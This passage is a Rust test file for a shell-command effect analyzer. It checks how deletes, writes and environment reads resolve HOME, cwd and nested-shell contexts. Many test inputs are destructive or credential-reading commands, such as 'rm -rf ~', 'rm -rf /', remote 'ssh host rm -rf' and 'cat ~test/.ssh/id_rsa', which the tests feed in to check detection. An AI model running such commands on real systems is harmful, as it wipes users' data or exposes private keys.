#![allow(clippy::disallowed_methods)]

use std::collections::HashMap;

use effinterp_engine::{
    Engine, SourceRefusal, SourceRequest, SourceResolver, SourceResponse, UnavailableReason,
    default_limits,
};
use effinterp_proto::{
    AttrValue, BoundaryClass, CoverageLevel, Domain, ExecutionAssurance, ExecutionEdgeKind,
    ExecutionRealm, HostContext, Limits, Plan, ProvenanceKind, ProvenanceRef, ResourceExpr,
    ResourceIdentity, Subject, validate_plan,
};

fn unbounded_steps() -> Limits {
    let mut limits = default_limits();
    limits.insert("max_analysis_steps".to_string(), u64::MAX);
    limits
}

fn shell(source: &str, cwd: Option<&str>) -> Plan {
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: source.into(),
            cwd: cwd.map(str::to_string),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan for {source:?}: {e:?}"));
    plan
}

fn shell_with_env(source: &str, env: &[(&str, &str)]) -> Plan {
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: source.to_string(),
            cwd: None,
            context: HostContext {
                env: env
                    .iter()
                    .map(|(name, value)| (name.to_string(), value.to_string()))
                    .collect(),
                ..Default::default()
            },
        })
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan for {source:?}: {e:?}"));
    plan
}

fn provenance_reaches(
    plan: &Plan,
    roots: &[ProvenanceRef],
    predicate: impl Fn(&ProvenanceKind) -> bool,
) -> bool {
    let mut pending = roots.to_vec();
    let mut seen = std::collections::BTreeSet::new();
    while let Some(reference) = pending.pop() {
        if !seen.insert(reference) {
            continue;
        }
        let node = &plan.provenance[reference.0 as usize];
        if predicate(&node.kind) {
            return true;
        }
        pending.extend(&node.antecedents);
    }
    false
}

fn assert_relative_delete_only_cites_home(plan: &Plan) {
    let deletes = plan
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "filesystem.delete")
        .collect::<Vec<_>>();
    assert_eq!(
        deletes.len(),
        2,
        "effects: {:?}\nboundaries: {:?}",
        plan.effects,
        plan.boundaries
    );
    for delete in deletes {
        let is_absolute = matches!(
            &delete.resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            } if path == "/tmp/x"
        );
        assert_eq!(
            provenance_reaches(plan, &delete.provenance, |kind| matches!(
                kind,
                ProvenanceKind::HostContext { name } if name == "HOME"
            )),
            !is_absolute,
            "{:?}",
            delete.resource
        );
    }
}

#[test]
fn host_context_resolves_home_and_records_its_source() {
    for source in [
        "rm -rf ~",
        r#"HOME=/tmp/example echo ok; rm -rf "$HOME""#,
        r#"HOME=/tmp/example USERPROFILE=/tmp/example echo ok; rm -rf "$HOME""#,
        r#"HOME=/tmp/example /usr/bin/printf ok; rm -rf "$HOME""#,
        r#"HOME=/tmp/example sh -c 'printf ok'; rm -rf "$HOME""#,
        r#"HOME=/tmp/example rm -rf "$HOME""#,
        r#"HOME=/tmp/example echo ok; rm -rf "${HOME-/tmp/fallback}""#,
        r#"HOME=/tmp/example echo ok; rm -rf "${HOME:-/tmp/fallback}""#,
        // A set value passes `?`/`:?`; only an unset or empty one aborts.
        r#"rm -rf "${HOME:?}""#,
        r#"rm -rf "${HOME?}""#,
        r#"rm -rf "${HOME:?HOME is unset}""#,
    ] {
        let plan = shell_with_env(
            source,
            &[("HOME", "/home/test"), ("USERPROFILE", "/profile")],
        );
        assert!(matches!(
            delete_resources(&plan)[0],
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                if path == "/home/test"
        ));
        let delete = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.delete")
            .unwrap();
        assert!(provenance_reaches(
            &plan,
            &delete.provenance,
            |kind| matches!(
                kind,
                ProvenanceKind::HostContext { name } if name == "HOME"
            )
        ));
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "environment.read"
                && matches!(
                    &effect.resource,
                    ResourceExpr::Concrete {
                        identity: ResourceIdentity::EnvironmentVariable { name }
                    } if name == "HOME"
                )
        }));
    }
}

#[test]
fn host_context_provenance_survives_subshell() {
    let plan = shell_with_env("(rm -rf ~)", &[("HOME", "/home/test")]);
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(matches!(
        &delete.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/home/test"
    ));
    assert!(provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(
            kind,
            ProvenanceKind::HostContext { name } if name == "HOME"
        )
    ));
}

#[test]
fn home_without_context_stays_symbolic() {
    let plan = shell("rm -rf ~", None);
    assert!(matches!(
        delete_resources(&plan)[0],
        ResourceExpr::Environment { name } if name == "HOME"
    ));
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "environment.read")
    );
}

#[test]
fn unset_home_does_not_resolve_tilde_to_cwd() {
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "unset HOME; rm -rf ~".to_string(),
            cwd: Some("/work".to_string()),
            context: HostContext {
                env: [("HOME".to_string(), "/home/test".to_string())]
                    .into_iter()
                    .collect(),
                ..Default::default()
            },
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(matches!(delete.resource, ResourceExpr::Unresolved { .. }));
    assert!(!provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn named_user_tilde_resolves_only_from_an_observed_account_home() {
    let analyze = |source: &str, user_homes: &[(&str, &str)]| {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/work".into()),
                context: HostContext {
                    user_homes: user_homes
                        .iter()
                        .map(|(user, home)| (user.to_string(), home.to_string()))
                        .collect(),
                    ..Default::default()
                },
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        plan
    };
    let user_home = |plan: &Plan| {
        plan.boundaries.iter().any(|boundary| {
            boundary.reason.as_str() == "unresolved_source"
                && matches!(
                    &boundary.affected_resource,
                    Some(ResourceExpr::Concrete {
                        identity: ResourceIdentity::UserHome { user }
                    }) if user == "test"
                )
        })
    };

    // Unobserved, the boundary names the account whose home would resolve it.
    let plan = analyze("cat ~test/.ssh/id_rsa", &[]);
    assert!(user_home(&plan), "{:?}", plan.boundaries);
    // Another user's observed home answers nothing about `test`.
    assert!(user_home(&analyze(
        "cat ~test/.ssh/id_rsa",
        &[("other", "/home/other")]
    )));

    let plan = analyze("cat ~test/.ssh/id_rsa", &[("test", "/home/test")]);
    assert!(plan.boundaries.is_empty(), "{:?}", plan.boundaries);
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.read"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            } if path == "/home/test/.ssh/id_rsa")
    }));
}

#[test]
fn nested_shell_environment_without_context_retains_assignments_and_unsets() {
    for source in [
        "export HOME=/script; sh -c 'rm -rf ~'",
        "unset HOME; sh -c 'rm -rf ~'",
    ] {
        let plan = shell(source, Some("/work"));
        let deletes = delete_resources(&plan);
        assert!(!deletes.is_empty());
        assert!(deletes.iter().all(
            |resource| matches!(resource, ResourceExpr::Environment { name } if name == "HOME")
        ));
        assert!(
            plan.execution_graph
                .nodes
                .iter()
                .any(|node| node.environment.contains_key("HOME"))
        );
    }

    let plan = shell("HOME=~/child sh -c 'rm -rf ~'", Some("/work"));
    let deletes = delete_resources(&plan);
    assert!(!deletes.is_empty());
    assert!(
        deletes.iter().all(
            |resource| matches!(resource, ResourceExpr::Environment { name } if name == "HOME")
        )
    );
}

#[test]
fn transition_environment_without_context_does_not_resolve_tilde() {
    for source in [
        "env HOME=/tmp sh -c 'rm -rf ~'",
        "docker run -e HOME=/inside -w /work alpine sh -c 'rm -rf ~'",
    ] {
        let plan = shell(source, None);
        assert!(delete_resources(&plan).iter().all(
            |resource| matches!(resource, ResourceExpr::Environment { name } if name == "HOME")
        ));
        assert!(
            plan.execution_graph
                .nodes
                .iter()
                .any(|node| node.environment.contains_key("HOME"))
        );
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "environment.read")
        );
    }
}

#[test]
fn prefix_environment_without_context_resolves_nested_command() {
    let plan = shell("X=rm bash -c '\"$X\" -rf /'", None);
    assert!(
        delete_resources(&plan)
            .iter()
            .any(|resource| matches!(resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/"))
    );
    assert!(
        plan.execution_graph
            .nodes
            .iter()
            .any(|node| node.environment.get("X")
                == Some(&Some(ResourceExpr::Literal {
                    value: "rm".to_string()
                })))
    );
}

#[test]
fn script_assignment_wins_over_host_context() {
    let plan = shell_with_env("HOME=/script; rm -rf ~", &[("HOME", "/home/test")]);
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(matches!(
        &delete.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/script"
    ));
    assert!(!provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(
            kind,
            ProvenanceKind::HostContext { name } if name == "HOME"
        )
    ));
}

#[test]
fn transition_environment_wins_over_host_context() {
    let plan = shell_with_env(
        "HOME=/transition sh -c 'rm -rf ~'",
        &[("HOME", "/home/test")],
    );
    assert!(delete_resources(&plan).iter().any(|resource| matches!(
        resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/transition"
    )));
}

#[test]
fn exported_shell_values_shadow_host_context_in_nested_shell() {
    for (source, expected) in [
        ("HOME=/script; sh -c 'rm -rf ~'", "/script"),
        ("export HOME=/exported; sh -c 'rm -rf ~'", "/exported"),
        (
            "export TARGET=/script; sh -c 'rm -rf \"$TARGET\"'",
            "/script",
        ),
    ] {
        let plan = shell_with_env(source, &[("HOME", "/home/test"), ("TARGET", "/host")]);
        let delete = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.delete")
            .unwrap();
        assert!(matches!(
            &delete.resource,
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                if path == expected
        ));
        let shadowed = if source.contains("TARGET") {
            "TARGET"
        } else {
            "HOME"
        };
        assert!(!provenance_reaches(
            &plan,
            &delete.provenance,
            |kind| matches!(
                kind,
                ProvenanceKind::HostContext { name } if name == shadowed
            )
        ));
    }
}

#[test]
fn unset_or_unexported_home_shadows_host_context_in_nested_shell() {
    for source in [
        "unset HOME; sh -c 'rm -rf ~'",
        "unset HOME; export HOME; sh -c 'rm -rf ~'",
        "unset HOME; HOME=/local; sh -c 'rm -rf ~'",
        "export -n HOME; sh -c 'rm -rf ~'",
        "env -u HOME sh -c 'HOME=/local; sh -c \"rm -rf ~\"'",
    ] {
        let plan = shell_with_env(source, &[("HOME", "/home/test")]);
        let delete = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.delete")
            .unwrap();
        assert!(matches!(delete.resource, ResourceExpr::Unresolved { .. }));
        assert!(!provenance_reaches(
            &plan,
            &delete.provenance,
            |kind| matches!(
                kind,
                ProvenanceKind::HostContext { name } if name == "HOME"
            )
        ));
    }
}

#[test]
fn transition_environment_expands_host_context_with_provenance() {
    let plan = shell_with_env("HOME=~/child sh -c 'rm -rf ~'", &[("HOME", "/home/test")]);
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(matches!(
        &delete.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/home/test/child"
    ));
    assert!(provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));

    let plan = shell_with_env(
        "HOME=\"$ALT\" sh -c 'rm -rf ~'",
        &[("ALT", "/alt"), ("HOME", "/host")],
    );
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(matches!(
        &delete.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/alt"
    ));
    assert!(provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "ALT")
    ));
    assert!(!provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn modeled_environment_preserves_value_provenance() {
    let plan = shell_with_env(
        "env HOME=\"$ALT\" sh -c 'rm -rf ~'",
        &[("ALT", "/alt"), ("HOME", "/host")],
    );
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(matches!(
        &delete.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/alt"
    ));
    assert!(provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "ALT")
    ));
    assert!(!provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));

    for executable in ["sh", "rm"] {
        let execution = plan
            .execution_graph
            .nodes
            .iter()
            .find(|node| {
                matches!(
                    &node.subject,
                    Subject::Exec { argv, .. }
                        if argv.first().is_some_and(|arg| arg == executable)
                )
            })
            .unwrap();
        assert!(provenance_reaches(
            &plan,
            &execution.evidence,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "ALT")
        ));
        assert!(!provenance_reaches(
            &plan,
            &execution.evidence,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
        ));
    }
}

#[test]
fn detached_flag_value_preserves_host_context_provenance() {
    let plan = shell_with_env("sort -o \"$HOME/out\" /tmp/in", &[("HOME", "/home/test")]);
    let write = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.write")
        .unwrap();
    assert!(matches!(
        &write.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/home/test/out"
    ));
    assert!(write.provenance.iter().any(|reference| matches!(
        plan.provenance[reference.0 as usize].kind,
        ProvenanceKind::Argument { index: 2 }
    )));
    assert!(provenance_reaches(
        &plan,
        &write.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn declarative_resource_inputs_preserve_host_context_provenance() {
    let plan = shell_with_env("cp -t \"$HOME\" /tmp/src", &[("HOME", "/home/test")]);
    let write = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.write")
        .unwrap();
    assert!(matches!(
        &write.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/home/test/src"
    ));
    assert!(write.provenance.iter().any(|reference| matches!(
        plan.provenance[reference.0 as usize].kind,
        ProvenanceKind::Argument { index: 2 }
    )));
    assert!(provenance_reaches(
        &plan,
        &write.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn declarative_relative_resource_input_preserves_cwd_provenance() {
    let plan = shell_with_env("cd ~; cp -t child /tmp/src", &[("HOME", "/home/test")]);
    let write = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.write")
        .unwrap();
    assert!(matches!(
        &write.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/home/test/child/src"
    ));
    assert!(provenance_reaches(
        &plan,
        &write.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn env_ignore_environment_clears_host_context() {
    let plan = shell_with_env("env -i sh -c 'rm -rf ~'", &[("HOME", "/home/test")]);
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(!matches!(
        &delete.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/home/test"
    ));
    assert!(!provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
    assert!(plan.execution_graph.nodes.iter().all(|node| {
        !matches!(
            &node.subject,
            Subject::Exec { argv, .. }
                if matches!(argv.first().map(String::as_str), Some("sh" | "rm"))
                    && matches!(
                        node.environment.get("HOME"),
                        Some(Some(ResourceExpr::Literal { value })) if value == "/home/test"
                    )
        )
    }));
}

#[test]
fn unknown_transition_environment_shadows_host_context() {
    let plan = shell_with_env("HOME=$X sh -c 'rm -rf ~'", &[("HOME", "/home/test")]);
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(matches!(delete.resource, ResourceExpr::Unresolved { .. }));
    assert!(!provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(
            kind,
            ProvenanceKind::HostContext { name } if name == "HOME"
        )
    ));
}

#[test]
fn container_shell_ignores_host_context() {
    let plan = shell_with_env(
        "docker run --rm alpine sh -c 'rm -rf ~'",
        &[("HOME", "/home/test")],
    );
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && !effect.realm.is_host()
            && matches!(&effect.resource, ResourceExpr::Environment { name } if name == "HOME")
    }));
}

#[test]
fn remote_shell_ignores_host_context() {
    let plan = shell_with_env("ssh host sh -c 'rm -rf ~'", &[("HOME", "/home/test")]);
    let remote = plan
        .execution_graph
        .nodes
        .iter()
        .find(|node| matches!(node.realm, ExecutionRealm::Remote { .. }))
        .unwrap();
    assert!(!remote.environment.contains_key("HOME"));
    assert!(plan.effects.iter().all(|effect| {
        !matches!(&effect.resource, ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path }
        } if path == "/home/test")
    }));
}

#[test]
fn ssh_preserves_symbolic_remote_shell_inputs() {
    for source in ["ssh host 'rm -rf $DIR'", "ssh host rm -rf \"$DIR\""] {
        let plan = shell(source, Some("/w"));
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.delete"
                && matches!(&effect.resource, ResourceExpr::Environment { name } if name == "DIR")
                && matches!(&effect.realm, ExecutionRealm::Remote { endpoint } if endpoint == "host")
        }));
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "environment.read"
                && matches!(&effect.resource, ResourceExpr::Concrete {
                    identity: ResourceIdentity::EnvironmentVariable { name }
                } if name == "DIR")
        }));
    }

    let symbolic_host = shell("ssh $HOST rm -rf /x", Some("/w"));
    assert!(symbolic_host.effects.iter().any(|effect| {
        effect.operation.0 == "network.connect"
            && matches!(&effect.resource, ResourceExpr::Join { parts }
                if matches!(parts.as_slice(), [
                    ResourceExpr::Literal { value },
                    ResourceExpr::Environment { name }
                ] if value == "ssh://" && name == "HOST"))
    }));
    assert!(symbolic_host.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && matches!(&effect.realm, ExecutionRealm::Remote { endpoint } if endpoint == "$HOST")
    }));
}

#[test]
fn ssh_unrecoverable_sources_stay_bounded() {
    let remote = shell("ssh host rm -rf $(cat list)", Some("/w"));
    assert!(
        remote
            .boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "remote_command")
    );
    assert!(!remote.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && matches!(effect.realm, ExecutionRealm::Remote { .. })
    }));
    assert!(
        remote
            .execution_graph
            .nodes
            .iter()
            .any(|node| node.boundary.is_some())
    );

    let finite_remote = shell(
        "for f in /a /b; do ssh host rm -rf \"$f\"; done",
        Some("/w"),
    );
    assert!(
        finite_remote
            .boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "remote_command")
    );
    assert!(!finite_remote.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && matches!(effect.realm, ExecutionRealm::Remote { .. })
    }));

    let proxy = shell("ssh -o ProxyCommand=$(x) host", Some("/w"));
    assert!(
        proxy
            .boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unrecoverable_source")
    );
    assert!(
        !proxy
            .effects
            .iter()
            .any(|effect| { effect.operation.0 == "filesystem.delete" && effect.realm.is_host() })
    );
}

#[test]
fn changed_cwd_provenance_reaches_host_context() {
    let plan = shell_with_env("cd ~; rm -rf .", &[("HOME", "/home/test")]);
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(matches!(
        &delete.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/home/test"
    ));
    assert!(provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(
            kind,
            ProvenanceKind::HostContext { name } if name == "HOME"
        )
    ));
    let execution = plan
        .execution_graph
        .nodes
        .iter()
        .find(|node| matches!(&node.subject, Subject::Exec { argv, .. } if argv.first().is_some_and(|arg| arg == "rm")))
        .unwrap();
    assert!(provenance_reaches(
        &plan,
        &execution.evidence,
        |kind| matches!(
            kind,
            ProvenanceKind::HostContext { name } if name == "HOME"
        )
    ));
}

#[test]
fn nested_js_relative_cwd_cites_host_context() {
    for (script, expected, reaches_home) in [
        ("require(\"fs\").rmSync(\"x\")", "/home/test/x", true),
        (
            "const path = \"x\"; require(\"fs\").rmSync(path)",
            "/home/test/x",
            true,
        ),
        ("require(\"fs\").rmSync(\"/tmp/x\")", "/tmp/x", false),
    ] {
        let source = format!("cd ~; node -e '{script}'");
        let plan = shell_with_env(&source, &[("HOME", "/home/test")]);
        let delete = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.delete")
            .unwrap();
        assert!(matches!(
            &delete.resource,
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                if path == expected
        ));
        assert_eq!(
            provenance_reaches(&plan, &delete.provenance, |kind| matches!(
                kind,
                ProvenanceKind::HostContext { name } if name == "HOME"
            )),
            reaches_home
        );
    }
}

#[test]
fn nested_inline_language_relative_cwd_cites_host_context() {
    for source in [
        "cd ~; python -c 'import os; os.remove(\"x\"); os.remove(\"/tmp/x\")'",
        "cd ~; ruby -e 'File.delete(\"x\"); File.delete(\"/tmp/x\")'",
        "cd ~; php -r 'unlink(\"x\"); unlink(\"/tmp/x\");'",
    ] {
        let plan = shell_with_env(source, &[("HOME", "/home/test")]);
        assert_relative_delete_only_cites_home(&plan);
    }
}

#[test]
fn process_cwd_provenance_reaches_host_context() {
    let plan = shell_with_env("cd ~; rm -rf /tmp/x", &[("HOME", "/home/test")]);
    let process = plan
        .effects
        .iter()
        .find(|effect| {
            effect.operation.0 == "process.exec"
                && matches!(
                    &effect.resource,
                    ResourceExpr::Concrete {
                        identity: ResourceIdentity::Process { executable, cwd, .. }
                    } if executable == "rm"
                        && matches!(cwd.as_deref(), Some(ResourceExpr::Concrete {
                            identity: ResourceIdentity::FsPath { path }
                        }) if path == "/home/test")
                )
        })
        .unwrap();
    assert!(provenance_reaches(
        &plan,
        &process.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(!provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn relative_directory_change_keeps_prior_cwd_provenance() {
    let plan = shell_with_env("cd ~; cd child; rm -rf .", &[("HOME", "/home/test")]);
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(matches!(
        &delete.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/home/test/child"
    ));
    assert!(provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(
            kind,
            ProvenanceKind::HostContext { name } if name == "HOME"
        )
    ));
}

#[test]
fn changed_cwd_provenance_survives_nested_host_execution() {
    for source in ["cd ~; sudo rm -rf .", "cd ~; sh -c 'rm -rf .'"] {
        let plan = shell_with_env(source, &[("HOME", "/home/test")]);
        let delete = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.delete")
            .unwrap();
        assert!(provenance_reaches(
            &plan,
            &delete.provenance,
            |kind| matches!(
                kind,
                ProvenanceKind::HostContext { name } if name == "HOME"
            )
        ));
    }
}

#[test]
fn env_chdir_replaces_nested_cwd_with_provenance() {
    let plan = shell_with_env("cd ~; env -C child rm -rf .", &[("HOME", "/home/test")]);
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(matches!(
        &delete.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/home/test/child"
    ));
    assert!(provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
    let execution = plan
        .execution_graph
        .nodes
        .iter()
        .find(|node| {
            matches!(
                &node.subject,
                Subject::Exec { argv, cwd, .. }
                    if argv.first().is_some_and(|arg| arg == "rm")
                        && cwd.as_deref() == Some("/home/test/child")
            )
        })
        .unwrap();
    assert!(provenance_reaches(
        &plan,
        &execution.evidence,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn context_free_literal_changed_cwd_has_no_provenance_chain() {
    let source = "cd /x; rm -rf y; rm -rf /tmp/z";
    let plan = shell(source, None);
    let deletes = plan
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "filesystem.delete")
        .collect::<Vec<_>>();
    assert!(matches!(
        &deletes[0].resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/x/y"
    ));
    assert!(matches!(
        &deletes[1].resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/tmp/z"
    ));
    let cites_cd =
        |kind: &ProvenanceKind| matches!(kind, ProvenanceKind::SourceSpan { start: 3, end: 5 });
    assert!(!provenance_reaches(&plan, &deletes[0].provenance, cites_cd));
    assert!(!provenance_reaches(&plan, &deletes[1].provenance, cites_cd));
}

#[test]
fn literal_changed_cwd_is_cited_only_by_relative_effects_with_context() {
    let source = "cd /x; rm -rf y; rm -rf /tmp/z";
    let plan = shell_with_env(source, &[("UNRELATED", "value")]);
    let deletes = plan
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "filesystem.delete")
        .collect::<Vec<_>>();
    let cites_cd =
        |kind: &ProvenanceKind| matches!(kind, ProvenanceKind::SourceSpan { start: 3, end: 5 });
    assert!(provenance_reaches(&plan, &deletes[0].provenance, cites_cd));
    assert!(!provenance_reaches(&plan, &deletes[1].provenance, cites_cd));
}

#[test]
fn derived_absolute_resource_does_not_cite_changed_cwd() {
    let plan = shell_with_env(
        "cd ~; tar -xf /tmp/a.tar -C /out",
        &[("HOME", "/home/test")],
    );
    let write = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.write")
        .unwrap();
    assert!(matches!(
        &write.resource,
        ResourceExpr::Pattern { pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern, .. } } if pattern == "/out/**"
    ));
    assert!(!provenance_reaches(
        &plan,
        &write.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn derived_relative_resource_cites_changed_cwd() {
    let plan = shell_with_env("cd ~; tar -xf /tmp/a.tar", &[("HOME", "/home/test")]);
    let write = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.write")
        .unwrap();
    assert!(matches!(
        &write.resource,
        ResourceExpr::Pattern { pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern, .. } } if pattern == "/home/test/**"
    ));
    assert!(provenance_reaches(
        &plan,
        &write.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn declarative_cwd_pattern_cites_host_context() {
    for source in ["cd ~; gtar -xzf a.tgz", "cd ~; gtar -xzf /tmp/a.tgz"] {
        let plan = shell_with_env(source, &[("HOME", "/home/test")]);
        let write = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.write")
            .unwrap();
        assert!(matches!(
            &write.resource,
            ResourceExpr::Pattern { pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern, .. } } if pattern == "/home/test/*"
        ));
        assert!(provenance_reaches(
            &plan,
            &write.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
        ));
    }
}

#[test]
fn declarative_basename_in_cwd_cites_host_context() {
    for source in ["cd ~; ln -s /data/config", "cd ~; ln -s \"$TARGET\""] {
        let plan = shell_with_env(
            source,
            &[("HOME", "/home/test"), ("TARGET", "/data/config")],
        );
        let create = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.create")
            .unwrap();
        assert!(matches!(
            &create.resource,
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                if path == "/home/test/config"
        ));
        assert!(provenance_reaches(
            &plan,
            &create.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
        ));
    }
}

#[test]
fn archive_destination_cites_host_context_input() {
    for source in [
        "tar -xf /tmp/a.tar -C \"$HOME/out\"",
        "unzip /tmp/a.zip -d \"$HOME/out\"",
    ] {
        let plan = shell_with_env(source, &[("HOME", "/home/test")]);
        let write = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.write")
            .unwrap();
        assert!(matches!(
            &write.resource,
